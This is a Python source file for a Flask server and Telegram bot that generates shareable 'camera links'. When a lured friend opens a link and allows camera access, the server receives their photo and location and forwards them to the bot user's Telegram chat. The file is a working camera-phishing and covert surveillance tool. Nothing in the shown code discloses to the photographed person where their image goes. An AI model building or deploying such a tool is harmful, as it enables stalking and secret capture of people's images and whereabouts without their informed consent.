import os
import base64
import uuid
import asyncio
from datetime import datetime, timezone
from flask import Flask, request, jsonify
from flask_cors import CORS
from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ==================== CONFIG ====================
BOT_TOKEN = os.environ['BOT_TOKEN']
PORT = int(os.getenv('PORT', 10000))
SITE_URL = os.getenv('SITE_URL', 'https://your-site.netlify.app')

app = Flask(__name__)
CORS(app)

bot = Bot(token=BOT_TOKEN)

# token → user_id mapping (in-memory)
# production me database use karo
active_tokens = {}


# ==================== TELEGRAM BOT HANDLERS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    keyboard = [[InlineKeyboardButton("🔗 Generate Link", callback_data='genlink')]]
    await update.message.reply_text(
        f"👋 Hi {u.first_name}!\n\n"
        f"Tap to generate a camera link:\n\n"
        f"Share this link with your friend.\n"
        f"When they open + allow camera, you'll get their photo here.",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


async def genlink(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()

    uid = q.from_user.id
    token = str(uuid.uuid4()).replace('-', '')[:12]
    active_tokens[token] = {
        'user_id': uid,
        'created': datetime.now(timezone.utc).isoformat()
    }

    link = f"{SITE_URL}?token={token}"

    keyboard = [[InlineKeyboardButton("🔗 Open Link", url=link)]]
    await q.edit_message_text(
        f"🔗 Your Camera Link:\n\n"
        f"`{link}`\n\n"
        f"📤 Copy karke friend ko bhejo.\n"
        f"Jab wo open karke camera Allow karega,\n"
        f"photo yaha aayegi.",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


async def myphoto(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📸 Ye bot tumhare liye photos collect karta hai.\n\n"
        "Link generate karne ke liye /start dabao."
    )


# ==================== FLASK ROUTES ====================
@app.route('/', methods=['GET'])
def health():
    return "OK", 200


@app.route('/api/verify-token', methods=['POST'])
def verify_token():
    """Check if token is valid"""
    data = request.json
    token = data.get('token')
    if token in active_tokens:
        return jsonify({'valid': True})
    return jsonify({'valid': False}), 404


@app.route('/api/upload', methods=['POST'])
def upload_photo():
    """Receive photo from browser, forward to Telegram"""
    try:
        data = request.json
        token = data.get('token')
        image_b64 = data.get('image')
        location = data.get('location', 'unknown')

        if token not in active_tokens:
            return jsonify({'error': 'invalid token'}), 400

        target_user = active_tokens[token]['user_id']

        # base64 image decode karo
        if ',' in image_b64:
            image_b64 = image_b64.split(',')[1]

        image_bytes = base64.b64decode(image_b64)

        # temp file
        filename = f"/tmp/photo_{token}_{int(datetime.now().timestamp())}.jpg"
        with open(filename, 'wb') as f:
            f.write(image_bytes)

        # bot se bhejo
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        async def send():
            with open(filename, 'rb') as f:
                await bot.send_photo(
                    chat_id=target_user,
                    photo=f,
                    caption=f"📸 Photo received\n\n"
                            f"🕐 {datetime.now().strftime('%d %b %Y, %I:%M %p')}\n"
                            f"🌐 Location: {location}"
                )

        loop.run_until_complete(send())
        loop.close()

        # delete temp file
        try:
            os.remove(filename)
        except:
            pass

        return jsonify({'status': 'success'})

    except Exception as e:
        print(f"Error: {e}")
        return jsonify({'error': str(e)}), 500


# ==================== START BOT ====================
def start_bot():
    """Start Telegram bot in background"""
    bot_app = Application.builder().token(BOT_TOKEN).build()
    bot_app.add_handler(CommandHandler('start', start))
    bot_app.add_handler(CommandHandler('myphoto', myphoto))
    bot_app.add_handler(CallbackQueryHandler(genlink, pattern='genlink'))

    print("🤖 Bot starting...")
    bot_app.run_polling(drop_pending_updates=True)


# ==================== MAIN ====================
if __name__ == '__main__':
    import threading

    # bot ko alag thread me chalao
    bot_thread = threading.Thread(target=start_bot, daemon=True)
    bot_thread.start()

    # flask app chalao
    app.run(host='0.0.0.0', port=PORT)
